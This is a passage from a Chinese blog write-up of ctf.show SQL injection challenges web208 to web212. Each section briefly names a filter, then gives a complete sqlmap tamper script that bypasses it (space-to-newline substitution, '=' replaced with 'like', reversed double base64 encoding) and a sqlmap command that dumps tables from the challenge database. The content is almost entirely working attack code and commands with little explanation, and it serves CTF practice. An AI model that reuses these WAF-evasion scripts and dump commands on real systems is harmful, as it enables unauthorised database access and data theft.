            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://58019b24-3bd7-46ac-86f3-7a0fff5252e3.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=8ebme8cbn2p1115q8o6v30eure"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://58019b24-3bd7-46ac-86f3-7a0fff5252e3.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>ctfshowweb208 <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flaxcac <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web209_619"></a>web209</h2> 
<p><code>过滤了*和=，=可以用like进行绕过</code></p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://56a0bb92-b5d5-4e2f-b0aa-675d6464ccfb.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=9ldsabortousnb6env3d8r1c9o"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://56a0bb92-b5d5-4e2f-b0aa-675d6464ccfb.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>ctfshowweb209 <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flav <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web210_677"></a>web210</h2> 
<p>逆转字符进行编码两次</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> winreg <span class="token keyword">import</span> REG_OPTION_VOLATILE
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">doublebase64encode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> retVal


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> doublebase64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://3baffbd5-123e-4dcb-9da2-1818d984122e.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=ln2mprcrsdm5bv927japm8nd5k"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://3baffbd5-123e-4dcb-9da2-1818d984122e.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>ctfshowweb210 <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flavi <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web211_747"></a>web211</h2> 
<p>过滤了空格</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> retVal
</code></pre> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://bd06083d-0e8d-4c0a-a0c7-67b1ee23dcf3.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=oou78nkq8ibif4nanjcm2u4tsn"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://bd06083d-0e8d-4c0a-a0c7-67b1ee23dcf3.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>ctfshowweb211 <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flavia <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web212_792"></a>web212</h2> 
<p>又增加过滤了*</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token triple-quoted-string string">"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> retVal
</code></pre> 
<pre><code class="prism language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://75718ebf-d370-436b-9b31-1f63be6eaf6e.challenge.ctf.show/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">-</span>agent<span class="token operator">=</span>sqlmap <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>text<span class="token operator">/</span>plain <span class="token operator">-</span><span class="token operator">-</span>cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=055tfssk0pd1a2gl0fgggs6545"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"http://75718ebf-d370-436b-9b31-1f63be6eaf6e.challenge.ctf.show/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>ctfshowweb212 <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_flavis <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<h2><a id="web213_840"></a>web213</h2>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4b76fff0e94c7ecdb0e57f04a3563cf8/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">我的创作纪念日3周年 2022-04-22</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/890b3cf132bd0d81950b902427a90309/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">BUUCTF[护网杯 2018]easy_tornado1-write up</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>